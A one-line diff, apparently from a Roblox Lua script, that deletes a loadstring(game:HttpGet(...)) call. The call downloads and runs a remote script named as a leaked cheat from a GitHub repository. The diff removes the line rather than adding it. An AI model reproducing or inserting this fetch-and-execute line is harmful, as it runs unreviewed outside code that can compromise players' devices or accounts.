@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/soupg/fallen_leaked/main/fallenleak.lua"))()
